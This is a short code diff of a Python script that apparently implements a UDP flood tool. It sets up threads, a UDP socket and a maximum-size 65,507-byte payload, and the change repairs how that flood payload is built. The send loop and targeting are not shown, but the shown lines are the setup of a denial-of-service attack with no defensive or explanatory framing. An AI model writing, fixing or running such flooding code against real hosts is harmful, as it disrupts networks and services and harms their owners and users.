@@ -1,10 +1,10 @@
 from socket import socket , AF_INET , SOCK_DGRAM
 from threading import Thread
-from os import system , name , urandom
+from os import system , name
 from time import sleep
 
 condition = True
-bytes = urandom([0xFF] * 65507)
+bytes = bytes([0xFF] * 65507)
 sock = socket(AF_INET , SOCK_DGRAM)
 
 def is_valid_ipv4(ip):
